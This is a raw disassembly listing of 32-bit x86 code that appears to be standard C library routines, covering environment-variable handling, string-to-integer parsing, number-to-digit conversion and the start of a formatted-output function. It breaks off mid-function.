mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08062ec0
jmp 0x80630f3
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edi, dword [arg_8h]
mov dword [esp], edi
call fcn.08053400
mov dword [var_10h], eax
mov eax, dword [0x80aa840]
test eax, eax
je 0x8063217
movzx edx, byte [edi]
test dl, dl
je 0x8063217
cmp byte [edi + 1], 0
jne 0x8063226
mov esi, eax
movzx dx, dl
mov eax, dword [eax]
mov word [var_12h], dx
or word [var_12h], 0x3d00
test eax, eax
je 0x8063217
mov ebx, eax
movzx eax, word [var_12h]
cmp ax, word [ebx]
je 0x8063221
add esi, 4
mov ebx, dword [esi]
test ebx, ebx
jne 0x8063205
xor eax, eax
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
lea eax, [ebx + 2]
jmp 0x8063219
movzx edx, word [edi]
mov esi, eax
sub dword [var_10h], 2
mov eax, dword [eax]
add edi, 2
test eax, eax
mov word [var_12h], dx
je 0x8063217
mov ebx, eax
mov esi, esi
movzx eax, word [var_12h]
cmp ax, word [ebx]
je 0x8063256
add esi, 4
mov eax, dword [esi]
test eax, eax
mov ebx, eax
jne 0x8063240
jmp 0x8063217
mov edx, dword [var_10h]
lea eax, [ebx + 2]
mov dword [var_4h], edi
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.08076fc0
test eax, eax
jne 0x8063249
mov eax, dword [var_10h]
cmp byte [eax + ebx + 2], 0x3d
jne 0x8063249
mov edx, dword [var_10h]
lea eax, [edx + ebx + 3]
jmp 0x8063219
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08053400
mov esi, dword [arg_ch]
mov dword [var_14h], 0
mov edi, eax
test esi, esi
je 0x80632f3
mov edx, dword [var_ch_2]
mov dword [esp], edx
call fcn.08053400
inc eax
mov dword [var_14h_2], eax
mov eax, 0
test eax, eax
je 0x8063308
mov dword [esp], 0x80aa984
call section.
mov esi, dword [0x80aa840]
mov dword [var_10h], 0
test esi, esi
je 0x8063351
mov ebx, dword [esi]
test ebx, ebx
je 0x8063351
nop
mov dword [var_8h], edi
mov eax, dword [var_8h]
mov dword [var_4h], eax
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08076fc0
test eax, eax
jne 0x8063345
mov eax, dword [esi]
cmp byte [edi + eax], 0x3d
je 0x80634dd
add esi, 4
inc dword [var_10h_2]
mov ecx, dword [esi]
test ecx, ecx
jne 0x8063320
mov edx, dword [var_10h]
lea eax, [edx*4 + 8]
mov dword [var_4h], eax
mov eax, dword [0x80aa9a0]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x80634c6
mov edx, dword [arg_10h]
test edx, edx
je 0x80633d8
mov edx, dword [var_10h_3]
mov eax, dword [var_10h_2]
mov dword [ebx + eax*4], edx
mov esi, dword [0x80aa840]
cmp esi, dword [0x80aa9a0]
je 0x80633a2
mov ecx, dword [var_10h_2]
mov edi, ebx
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_10h_2]
mov dword [0x80aa840], ebx
mov dword [0x80aa9a0], ebx
mov dword [ebx + eax*4 + 4], 0
mov eax, 0
test eax, eax
je 0x80633ce
mov dword [esp], 0x80aa984
call section.
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_14h]
mov dword [var_18h], esp
lea esi, [eax + edi]
lea eax, [esi + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea edx, [var_1bh]
and edx, 0xfffffff0
mov dword [var_1ch], edx
mov dword [var_8h], edi
mov eax, dword [var_8h]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08053740
mov byte [eax], 0x3d
mov edx, dword [var_14h_2]
inc eax
mov dword [var_8h], edx
mov edx, dword [var_ch_2]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053740
mov dword [var_4h], 0x80aa99c
mov dword [var_8h], fcn.08076e50
mov eax, dword [var_1ch]
mov dword [esp], eax
call fcn.0807a2c0
xor edx, edx
test eax, eax
je 0x8063443
mov edx, dword [eax]
mov eax, dword [var_10h_2]
test edx, edx
mov dword [ebx + eax*4], edx
jne 0x8063491
inc esi
mov dword [esp], esi
call fcn.08050fe0
mov edx, dword [var_10h_2]
test eax, eax
mov dword [ebx + edx*4], eax
je 0x8063499
mov dword [var_8h], esi
mov edx, dword [var_1ch]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [var_4h], 0x80aa99c
mov dword [var_8h], fcn.08076e50
mov edx, dword [var_10h_2]
mov eax, dword [ebx + edx*4]
mov dword [esp], eax
call fcn.0807a190
mov esp, dword [var_18h_2]
jmp 0x8063386
call fcn.08048b20
mov dword [eax], 0xc
mov eax, 0
test eax, eax
je 0x80634b9
mov dword [esp], 0x80aa984
call section.
mov esp, dword [var_18h_2]
mov eax, 0xffffffff
jmp 0x80633d0
mov eax, 0
test eax, eax
je 0x80634bc
mov dword [esp], 0x80aa984
call section.
jmp 0x80634bc
test eax, eax
je 0x8063351
mov eax, dword [var_14h_3]
test eax, eax
je 0x80633b9
mov ebx, dword [var_10h_3]
test ebx, ebx
je 0x80634fe
mov dword [esi], ebx
jmp 0x80633b9
mov edx, dword [var_14h_2]
mov dword [var_20h], esp
add edx, edi
mov eax, edx
mov dword [var_24h], edx
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
and eax, 0xfffffff0
mov dword [var_28h], eax
mov dword [var_8h], edi
mov edx, dword [var_8h]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053740
mov byte [eax], 0x3d
mov edx, dword [var_14h_2]
inc eax
mov dword [var_8h], edx
mov edx, dword [var_ch_2]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053740
mov dword [var_4h], 0x80aa99c
mov dword [var_8h], fcn.08076e50
mov eax, dword [var_28h]
mov dword [esp], eax
call fcn.0807a2c0
xor edx, edx
test eax, eax
je 0x806356d
mov edx, dword [eax]
test edx, edx
mov ebx, edx
jne 0x80635b0
mov edi, dword [var_24h]
inc edi
mov dword [esp], edi
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x80635b8
mov dword [var_8h], edi
mov edx, dword [var_28h]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [esp], ebx
mov dword [var_4h], 0x80aa99c
mov dword [var_8h], fcn.08076e50
call fcn.0807a190
mov esp, dword [var_20h]
jmp 0x80634f7
mov eax, 0
test eax, eax
je 0x80635cd
mov dword [esp], 0x80aa984
call section.
mov esp, dword [var_20h]
jmp 0x80634bc
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test ebx, ebx
je 0x8063609
cmp byte [ebx], 0
je 0x8063609
mov dword [var_sp_4h], 0x3d
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
je 0x806361e
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [esp], ebx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call fcn.080632c0
jmp 0x8063619
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
test esi, esi
je 0x806366f
cmp byte [esi], 0
je 0x806366f
mov dword [var_sp_4h], 0x3d
mov dword [esp], esi
call fcn.08076ce0
test eax, eax
je 0x806368a
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [esp], esi
call fcn.08053400
mov edi, eax
mov eax, 0
test eax, eax
je 0x80636a9
mov dword [esp], 0x80aa984
call section.
mov ebx, dword [0x80aa840]
mov eax, dword [ebx]
test eax, eax
je 0x80636dc
mov dword [var_sp_8h], edi
mov dword [var_sp_4h], esi
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08076fc0
test eax, eax
jne 0x80636d3
mov eax, dword [ebx]
cmp byte [edi + eax], 0x3d
je 0x80636f5
add ebx, 4
mov eax, dword [ebx]
test eax, eax
jne 0x80636b5
mov eax, 0
test eax, eax
je 0x80636f1
mov dword [esp], 0x80aa984
call section.
xor eax, eax
jmp 0x806367f
mov edx, ebx
mov eax, dword [edx + 4]
mov dword [edx], eax
add edx, 4
test eax, eax
jne 0x80636f7
jmp 0x80636d6
lea esi, [esi]
lea edi, [edi]
push ebp
mov eax, 0
mov ebp, esp
sub esp, 4
test eax, eax
je 0x806372b
mov dword [esp], 0x80aa984
call section.
mov eax, dword [0x80aa840]
cmp eax, dword [0x80aa9a0]
je 0x806375b
mov eax, 0
mov dword [0x80aa840], 0
test eax, eax
je 0x8063757
mov dword [esp], 0x80aa984
call section.
xor eax, eax
leave
ret
test eax, eax
je 0x8063738
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aa9a0], 0
jmp 0x8063738
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x80637c1
mov dword [esp], 3
call section.
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08063840
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x806379b
nop
lea esi, [esi]
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x8063812
mov dword [esp], 3
call section.
mov dword [esp + 0x10], eax
mov dword [esp + 0xc], 0
mov eax, dword [ebp + 0x10]
mov dword [esp + 8], eax
mov eax, dword [ebp + 0xc]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.08063840
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x80637eb
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x40
mov dword [var_2ch], 0
mov dword [var_28h], 0
mov edx, dword [arg_18h]
mov esi, dword [arg_10h]
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
test edx, edx
jne 0x8063b98
mov dword [var_30h], 0
test esi, esi
js 0x8063880
cmp esi, 1
je 0x8063880
cmp esi, 0x24
jle 0x8063895
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
add esp, 0x40
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [arg_8h]
mov edi, dword [arg_18h]
mov dword [var_1ch], ebx
mov edi, dword [edi + 0x34]
movsx eax, byte [ebx]
mov dword [var_3ch], edi
test byte [edi + eax*2 + 1], 0x20
je 0x8063b8d
inc ebx
mov ecx, dword [var_3ch]
movzx edx, byte [ebx]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x80638b2
test dl, dl
je 0x80639c2
cmp dl, 0x2d
mov dword [var_10h], 0
je 0x8063b84
cmp dl, 0x2b
je 0x8063b7b
cmp dl, 0x30
je 0x8063b43
test esi, esi
mov eax, 0xa
cmove esi, eax
cmp esi, 0xa
mov eax, 0
mov dword [var_1ch], ebx
cmove eax, dword [var_30h]
mov dword [var_20h], 0
test eax, eax
mov dword [var_30h], eax
jne 0x8063a8f
movzx eax, byte [esi + 0x80928fe]
mov edi, dword [esi*4 + 0x8092858]
mov dword [var_24h], 0
mov dword [var_3ch], 0
mov dword [var_14h], edi
mov dword [var_18h], eax
movzx ecx, byte [ebx]
test cl, cl
je 0x8063982
cmp ebx, dword [var_20h]
je 0x8063982
lea eax, [ecx - 0x30]
cmp al, 9
ja 0x8063a1e
mov ecx, eax
movzx eax, cl
cmp eax, esi
jge 0x8063982
mov edx, dword [var_14h]
cmp dword [var_3ch], edx
ja 0x8063a12
je 0x8063a09
mov edi, dword [var_3ch]
movzx eax, cl
imul edi, esi
add edi, eax
mov dword [var_3ch], edi
inc ebx
movzx ecx, byte [ebx]
test cl, cl
jne 0x8063941
cmp ebx, dword [var_1ch]
je 0x80639c2
mov esi, dword [arg_ch]
test esi, esi
je 0x8063993
mov eax, dword [arg_ch]
mov dword [eax], ebx
mov ecx, dword [var_24h]
test ecx, ecx
jne 0x80639ad
mov eax, dword [var_3ch]
mov edx, dword [var_10h]
neg eax
test edx, edx
cmove eax, dword [var_3ch]
jmp 0x806388d
call fcn.08048b20
mov dword [eax], 0x22
mov eax, 0xffffffff
jmp 0x806388d
mov eax, dword [arg_ch]
test eax, eax
je 0x806388b
mov eax, dword [var_1ch]
sub eax, dword [arg_8h]
dec eax
jle 0x80639e9
mov ecx, dword [var_1ch]
mov edi, dword [arg_18h]
movsx edx, byte [ecx - 1]
mov eax, dword [edi + 0x3c]
cmp dword [eax + edx*4], 0x58
je 0x80639f6
mov edi, dword [arg_8h]
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x806388b
cmp byte [ecx - 2], 0x30
jne 0x80639e9
mov edx, dword [arg_ch]
mov eax, ecx
dec eax
mov dword [edx], eax
jmp 0x806388b
cmp eax, dword [var_18h]
jbe 0x806396c
mov dword [var_24h], 1
jmp 0x806397a
mov edi, dword [var_2ch]
test edi, edi
je 0x8063a76
xor edx, edx
cmp edx, dword [var_2ch]
jae 0x8063a42
lea esi, [esi]
mov edi, dword [var_28h]
movzx eax, byte [edx + ebx]
cmp byte [edx + edi], al
jne 0x8063a42
inc edx
cmp edx, dword [var_2ch]
jb 0x8063a30
cmp edx, dword [var_2ch]
je 0x8063a6a
movzx edx, cl
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x8063982
mov eax, dword [ecx + 0x3c]
movzx ecx, byte [eax + edx*4]
sub ecx, 0x37
jmp 0x8063953
mov eax, dword [var_2ch]
lea ebx, [eax + ebx - 1]
jmp 0x806397a
mov edi, dword [arg_18h]
movzx edx, cl
mov eax, dword [edi + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x8063982
mov eax, dword [edi + 0x3c]
jmp 0x8063a5e
mov edi, dword [var_28h]
mov dword [esp], edi
call fcn.08053400
xor edx, edx
mov dword [var_20h], ebx
mov dword [var_2ch], eax
mov dword [var_34h], eax
cmp edx, dword [var_2ch]
jae 0x8063abc
mov ecx, dword [var_28h]
movzx eax, byte [edx + ebx]
cmp byte [edx + ecx], al
jne 0x8063abc
inc edx
cmp edx, dword [var_34h]
jb 0x8063aaa
cmp edx, dword [var_34h]
jae 0x8063918
movzx ecx, byte [ebx]
test cl, cl
je 0x8063b1e
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x8063b11
xor edx, edx
cmp edx, dword [var_34h]
jae 0x8063aef
mov eax, dword [var_20h]
mov edi, dword [var_28h]
movzx eax, byte [edx + eax]
cmp byte [edx + edi], al
jne 0x8063aef
inc edx
cmp edx, dword [var_34h]
jb 0x8063ada
cmp edx, dword [var_34h]
jae 0x8063b11
mov eax, dword [var_3ch]
movzx edx, cl
test byte [eax + edx*2 + 1], 4
je 0x8063b1e
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x3c]
mov eax, dword [eax + edx*4]
sub eax, 0x37
cmp eax, esi
jge 0x8063b1e
inc dword [var_20h]
mov edi, dword [var_20h]
movzx ecx, byte [edi]
test cl, cl
jne 0x8063acc
mov eax, dword [var_30h]
mov edx, dword [var_28h]
mov dword [esp], ebx
mov ecx, dword [var_20h]
mov dword [var_ch], eax
mov dword [var_8h], edx
mov dword [var_4h], ecx
call fcn.08049980
mov dword [var_20h], eax
jmp 0x8063918
test esi, esi
je 0x8063b5e
cmp esi, 0x10
je 0x8063b5e
test esi, esi
jne 0x80638f7
mov esi, 8
jmp 0x80638f7
mov ecx, dword [arg_18h]
movsx edx, byte [ebx + 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
jne 0x8063b4c
add ebx, 2
mov esi, 0x10
jmp 0x80638f7
inc ebx
movzx edx, byte [ebx]
jmp 0x80638e4
mov dword [var_10h], 1
jmp 0x8063b7b
mov edi, dword [arg_8h]
movzx edx, byte [edi]
jmp 0x80638c3
mov ecx, dword [eax + 0x2c]
mov dword [var_30h], ecx
movzx edx, byte [ecx]
test dl, dl
jle 0x806386b
cmp dl, 0x7f
je 0x806386b
mov eax, dword [eax + 0x28]
mov dword [var_28h], eax
cmp byte [eax], 0
jne 0x8063872
mov dword [var_28h], 0
jmp 0x806386b
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08063840
leave
ret
push ebp
mov ebp, esp
push edi
mov edi, str.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZto_outpunct
mov eax, dword [arg_14h]
push esi
mov ecx, dword [arg_8h]
mov esi, dword [arg_10h]
push ebx
mov ebx, dword [arg_ch]
test eax, eax
mov eax, 0x80a0960
cmove edi, eax
cmp esi, 0xa
je 0x8063c75
ja 0x8063c5d
cmp esi, 8
je 0x8063c4a
lea esi, [esi]
mov eax, ecx
xor edx, edx
dec ebx
div esi
mov ecx, eax
movzx eax, byte [edx + edi]
test ecx, ecx
mov byte [ebx], al
jne 0x8063c30
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
dec ebx
and eax, 7
shr ecx, 3
movzx eax, byte [eax + edi]
mov byte [ebx], al
jne 0x8063c4a
jmp 0x8063c43
cmp esi, 0x10
jne 0x8063c30
mov eax, ecx
dec ebx
and eax, 0xf
shr ecx, 4
movzx eax, byte [eax + edi]
mov byte [ebx], al
jne 0x8063c62
jmp 0x8063c43
mov esi, 0xcccccccd
lea esi, [esi]
mov eax, ecx
dec ebx
mul esi
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub ecx, eax
test edx, edx
movzx eax, byte [ecx + edi]
mov ecx, edx
mov byte [ebx], al
jne 0x8063c80
jmp 0x8063c43
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov esi, dword [arg_18h]
mov dword [var_28h], str.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZto_outpunct
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov ebx, dword [arg_10h]
test esi, esi
mov dword [var_24h], eax
mov dword [var_20h], edx
mov eax, 0x80a0960
cmovne eax, dword [var_28h]
mov edx, dword [arg_14h]
cmp edx, 8
mov dword [var_28h], eax
lea eax, [edx + edx*2]
lea eax, [eax*4 + str.nplurals]
mov dword [var_38h], eax
je 0x8063dff
cmp edx, 0x10
je 0x8063dbe
mov edi, dword [var_20h]
mov esi, edi
xor edi, edi
test esi, esi
mov dword [var_34h], esi
mov dword [var_30h], edi
je 0x8063dac
mov edi, dword [var_38h]
mov eax, dword [var_34h]
cmp dword [edi + 8], eax
ja 0x8063d91
xor edx, edx
mov dword [var_2ch], 3
div dword [edi + 8]
mov ecx, eax
mov eax, dword [var_24h]
div dword [edi + 8]
mov dword [var_14h], edx
mov edx, ecx
div dword [edi + 8]
mov dword [var_1ch], eax
mov dword [var_18h], edx
dec dword [var_2ch]
xor esi, esi
mov edi, dword [var_2ch]
mov eax, dword [ebp + edi*4 - 0x1c]
test eax, eax
je 0x8063d5c
xor edx, edx
mov edi, dword [var_28h]
dec ebx
div dword [arg_14h]
inc esi
mov ecx, eax
movzx eax, byte [edx + edi]
test ecx, ecx
mov byte [ebx], al
mov eax, ecx
jne 0x8063d44
mov ecx, dword [var_2ch]
test ecx, ecx
je 0x8063d87
mov edx, dword [var_38h]
movsx eax, byte [edx + 5]
cmp esi, eax
jge 0x8063d80
mov esi, esi
dec ebx
inc esi
mov byte [ebx], 0x30
mov ecx, dword [var_38h]
movsx eax, byte [ecx + 5]
cmp esi, eax
jl 0x8063d70
mov edx, dword [var_2ch]
test edx, edx
jne 0x8063d34
add esp, 0x2c
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_38h]
mov eax, dword [var_24h]
mov dword [var_2ch], 2
mov edx, dword [var_34h]
div dword [ecx + 8]
mov dword [var_18h], edx
mov dword [var_1ch], eax
jmp 0x8063d34
mov esi, dword [var_24h]
mov dword [var_2ch], 1
mov dword [var_1ch], esi
jmp 0x8063d34
mov edx, dword [var_20h]
test edx, edx
je 0x8063dfa
mov ecx, dword [var_24h]
mov esi, 8
mov edi, dword [var_28h]
mov eax, ecx
dec esi
and eax, 0xf
dec ebx
shr ecx, 4
test esi, esi
movzx eax, byte [eax + edi]
mov byte [ebx], al
jg 0x8063dcd
mov ecx, dword [var_28h]
mov eax, edx
dec ebx
and eax, 0xf
shr edx, 4
movzx eax, byte [eax + ecx]
mov byte [ebx], al
jne 0x8063de4
jmp 0x8063d87
mov edx, dword [var_24h]
jmp 0x8063de4
mov edx, dword [var_20h]
test edx, edx
je 0x8063e5a
mov ecx, dword [var_24h]
mov esi, 0xa
mov edi, dword [var_28h]
mov eax, ecx
dec esi
and eax, 7
dec ebx
shr ecx, 3
test esi, esi
movzx eax, byte [eax + edi]
mov byte [ebx], al
jg 0x8063e0e
mov eax, edx
and eax, 1
shl eax, 2
or ecx, eax
shr edx, 1
jne 0x8063e4e
mov edx, ecx
mov edi, dword [var_28h]
mov eax, edx
dec ebx
and eax, 7
shr edx, 3
movzx eax, byte [eax + edi]
mov byte [ebx], al
jne 0x8063e35
jmp 0x8063d87
mov esi, dword [var_28h]
dec ebx
movzx eax, byte [ecx + esi]
mov byte [ebx], al
jmp 0x8063e35
mov edx, dword [var_24h]
jmp 0x8063e35
nop
push ebp
mov ebp, esp
push ebx
sub esp, 0x20
mov eax, dword [arg_14h]
mov ebx, dword [arg_ch]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
lea eax, [var_4h]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08063c00
mov edx, eax
lea eax, [var_4h]
cmp edx, eax
jae 0x8063ea1
movzx eax, byte [edx]
inc edx
mov byte [ebx], al
lea eax, [var_4h]
inc ebx
cmp edx, eax
jb 0x8063e93
mov eax, ebx
add esp, 0x20
pop ebx
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push ebx
sub esp, 0x34
mov edx, dword [arg_ch]
mov eax, dword [arg_18h]
mov ebx, dword [arg_10h]
mov dword [var_10h], eax
mov dword [var_4h], edx
mov eax, dword [arg_14h]
mov dword [var_ch], eax
lea eax, [var_bp_4h]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08063ca0
mov edx, eax
lea eax, [var_bp_4h]
cmp edx, eax
jae 0x8063efe
lea esi, [esi]
movzx eax, byte [edx]
inc edx
mov byte [ebx], al
lea eax, [var_bp_4h]
inc ebx
cmp edx, eax
jb 0x8063ef0
mov eax, ebx
add esp, 0x34
pop ebx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x44
mov edi, dword [arg_8h]
mov dword [esp], 0x80a09c4
call fcn.0807ac80
mov dword [esp], 0x2e
mov dword [var_38h], eax
mov dword [var_4h], eax
call fcn.0807ad50
mov esi, eax
mov dword [esp], 0x2c
mov eax, dword [var_38h]
mov dword [var_4h], eax
call fcn.0807ad50
mov edx, dword [var_38h]
mov dword [var_3ch], eax
test edx, edx
jne 0x8064076
mov edx, dword [arg_ch]
sub edx, edi
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_4h], edi
mov dword [var_8h], edx
and eax, 0xfffffff0
mov dword [var_40h], eax
mov dword [esp], eax
call fcn.08053740
mov esi, eax
mov edi, dword [arg_ch]
dec esi
cmp esi, dword [var_40h]
jb 0x8064026
movzx edx, byte [esi]
lea eax, [edx - 0x30]
cmp al, 9
ja 0x8064037
movsx eax, dl
lea ebx, [eax - 0x30]
cmp ebx, 9
ja 0x80640e1
mov eax, 0
test eax, eax
je 0x8064030
mov dword [esp], 3
call section.
mov eax, dword [eax]
lea edx, [ebx + 0x29]
and edx, 0xffff
mov ebx, dword [eax + edx*4 + 0x24]
mov dword [esp], ebx
call fcn.08053400
mov ecx, edi
mov edx, eax
sub ecx, eax
dec edx
test eax, eax
je 0x806401e
movzx eax, byte [edx + ebx]
mov byte [edx + ecx], al
mov eax, edx
dec edx
test eax, eax
jne 0x8064010
mov edi, ecx
dec esi
cmp esi, dword [var_40h]
jae 0x8063fc0
lea esp, [var_ch]
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8063fee
mov eax, dword [var_38h]
test eax, eax
jne 0x8064043
dec edi
mov byte [edi], dl
jmp 0x8064020
cmp dl, 0x2e
je 0x8064071
cmp dl, 0x2c
jne 0x806403e
lea ebx, [var_2ch]
mov dword [esp], ebx
call fcn.08053400
mov edx, eax
sub edi, eax
dec edx
test eax, eax
je 0x8064020
movzx eax, byte [edx + ebx]
mov byte [edx + edi], al
mov eax, edx
dec edx
test eax, eax
jne 0x8064061
jmp 0x8064020
lea ebx, [var_1ch]
jmp 0x8064050
lea ebx, [var_34h]
lea eax, [var_1ch]
mov dword [var_34h], 0
mov dword [var_30h], 0
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08077b00
mov dword [var_8h], ebx
inc eax
mov edx, 0x2e
mov dword [var_34h], 0
cmovne dx, word [var_1ch]
mov eax, dword [var_3ch]
mov dword [var_30h], 0
mov dword [var_4h], eax
lea eax, [var_2ch]
mov word [var_1ch], dx
mov dword [esp], eax
call fcn.08077b00
inc eax
mov edx, 0x2c
cmovne dx, word [var_2ch]
mov word [var_2ch], dx
jmp 0x8063f8e
mov dword [var_sp_ch], str.outdigit_value
mov dword [var_8h], 0x24
mov dword [var_4h], str..._locale_outdigits.h
mov dword [esp], str.0___n__n___9
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push ebx
mov ebx, dword [var_4h]
mov edx, dword [ebx]
movzx eax, byte [edx]
lea ecx, [eax - 0x30]
lea eax, [edx + 1]
mov dword [ebx], eax
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
ja 0x806414d
mov edx, dword [ebx]
lea ecx, [ecx + ecx*4]
movzx eax, byte [edx]
lea ecx, [eax + ecx*2 - 0x30]
lea eax, [edx + 1]
mov dword [ebx], eax
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x8064130
pop ebx
mov eax, ecx
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x58c
mov dword [var_4a8h], 0
mov esi, dword [arg_ch]
call fcn.08048b20
mov ecx, dword [arg_8h]
mov edx, dword [eax]
mov dword [var_4c8h], edx
mov edx, dword [ecx + 0x5c]
test edx, edx
jne 0x806419c
mov dword [ecx + 0x5c], 0xffffffff
mov edx, 0xffffffff
inc edx
mov ecx, 0xffffffff
jne 0x80641ce
mov edi, dword [arg_8h]
mov edx, dword [edi]
test dl, 8
jne 0x8067601
test esi, esi
je 0x80675f1
and edx, 2
je 0x80641d8
mov ecx, dword [arg_10h]
mov eax, dword [arg_8h]
mov edx, esi
call fcn.08067ab0
mov ecx, eax
lea esp, [var_ch]
mov eax, ecx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_10h]
lea edx, [var_444h]
mov dword [var_4ach], 0xffffffff
mov dword [var_4c4h], 0
mov dword [var_444h], 0
mov dword [var_440h], 0
mov dword [var_4c0h], eax
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08074610
mov ecx, dword [arg_8h]
mov dword [var_4cch], 0
mov dword [var_4b4h], eax
mov dword [var_44ch], eax
movzx edx, word [ecx]
test dx, dx
js 0x8064270
mov eax, 0
test eax, eax
je 0x8064270
lea eax, [var_40ch]
mov dword [var_4cch], 1
mov dword [var_4h], fcn.08074580
mov dword [var_8h], ecx
mov dword [esp], eax
call section.
mov edi, dword [arg_8h]
movzx edx, word [edi]
nop
test dx, dx
jns 0x80675e1
